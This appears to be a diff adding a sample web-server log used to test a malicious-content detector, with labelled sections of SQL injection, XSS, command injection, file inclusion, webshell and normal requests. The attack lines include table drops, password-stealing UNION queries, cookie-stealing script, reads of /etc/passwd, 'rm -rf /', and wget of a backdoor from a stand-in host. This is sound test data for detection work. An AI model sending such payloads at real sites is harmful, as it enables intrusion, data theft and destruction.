@@ -1,0 +1,40 @@
+# Example logs to test the Malicious Content Detection application
+# Each section contains different types of potential threats
+
+# --- SQL Injection Examples ---
+192.168.1.105 - - [02/Aug/2025:14:23:15 +0000] "GET /products.php?id=1 OR 1=1 HTTP/1.1" 200 3421
+192.168.1.107 - - [02/Aug/2025:15:43:21 +0000] "POST /login.php HTTP/1.1" "username=admin'; DROP TABLE users;--" 500 213
+192.168.1.110 - - [02/Aug/2025:16:12:45 +0000] "GET /search.php?q=phone' UNION SELECT username,password FROM users;-- HTTP/1.1" 200 1532
+192.168.1.113 - - [02/Aug/2025:17:05:10 +0000] "POST /query.php HTTP/1.1" "query=SELECT * FROM products WHERE category='electronics'" 200 4215
+
+# --- XSS Examples ---
+192.168.1.120 - - [02/Aug/2025:18:15:23 +0000] "GET /comment.php?text=<script>alert('XSS')</script> HTTP/1.1" 200 845
+192.168.1.122 - - [02/Aug/2025:18:45:12 +0000] "POST /profile.php HTTP/1.1" "bio=<img src='x' onerror='alert(1)'>" 200 1267
+192.168.1.124 - - [02/Aug/2025:19:10:35 +0000] "GET /search?q=test';javascript:alert(document.cookie) HTTP/1.1" 200 953
+192.168.1.126 - - [02/Aug/2025:19:23:45 +0000] "POST /comment.php HTTP/1.1" "comment=Great product! <script>eval(atob('YWxlcnQoJ2hhY2tlZCEnKQ=='))</script>" 200 712
+
+# --- Command Injection Examples ---
+192.168.1.130 - - [02/Aug/2025:20:12:18 +0000] "GET /ping.php?host=google.com;cat /etc/passwd HTTP/1.1" 500 231
+192.168.1.133 - - [02/Aug/2025:20:45:33 +0000] "POST /admin/config.php HTTP/1.1" "command=system('rm -rf /')" 403 187
+192.168.1.135 - - [02/Aug/2025:21:15:22 +0000] "GET /tools.php?cmd=exec('whoami') HTTP/1.1" 500 245
+192.168.1.137 - - [02/Aug/2025:21:38:45 +0000] "POST /debug.php HTTP/1.1" "debug=true&exec=cmd.exe /c dir" 500 312
+
+# --- File Inclusion Examples ---
+192.168.1.140 - - [02/Aug/2025:22:10:15 +0000] "GET /page.php?file=../../../etc/passwd HTTP/1.1" 200 1243
+192.168.1.142 - - [02/Aug/2025:22:33:27 +0000] "GET /include.php?module=https://malicious-site.com/backdoor.php HTTP/1.1" 500 276
+192.168.1.144 - - [02/Aug/2025:23:05:42 +0000] "POST /load.php HTTP/1.1" "path=../../config/database.php" 403 198
+192.168.1.146 - - [02/Aug/2025:23:25:18 +0000] "GET /api.php?action=include_once('malicious.php') HTTP/1.1" 500 245
+
+# --- Webshell Examples ---
+192.168.1.150 - - [03/Aug/2025:00:15:33 +0000] "POST /uploads/c99shell.php HTTP/1.1" "cmd=ls -la" 200 1532
+192.168.1.152 - - [03/Aug/2025:00:45:12 +0000] "GET /images/r57shell.php?cmd=whoami HTTP/1.1" 404 213
+192.168.1.154 - - [03/Aug/2025:01:12:45 +0000] "POST /backup/wso.php HTTP/1.1" "password=123456&a=FilesMan" 404 198
+192.168.1.156 - - [03/Aug/2025:01:33:27 +0000] "GET /cache/b374k.php?cmd=wget+https://malicious-site.com/backdoor HTTP/1.1" 404 234
+
+# --- Normal Traffic (no malicious content) ---
+192.168.1.160 - - [03/Aug/2025:02:15:22 +0000] "GET /index.html HTTP/1.1" 200 4532
+192.168.1.162 - - [03/Aug/2025:02:45:18 +0000] "GET /products/list HTTP/1.1" 200 8745
+192.168.1.164 - - [03/Aug/2025:03:10:33 +0000] "POST /login HTTP/1.1" "username=john&password=12345" 302 0
+192.168.1.166 - - [03/Aug/2025:03:33:27 +0000] "GET /about.html HTTP/1.1" 200 3245
+192.168.1.168 - - [03/Aug/2025:04:05:12 +0000] "GET /contact.php HTTP/1.1" 200 2176
+192.168.1.170 - - [03/Aug/2025:04:25:45 +0000] "POST /newsletter HTTP/1.1" "email=user@example.com&subscribe=true" 200 543
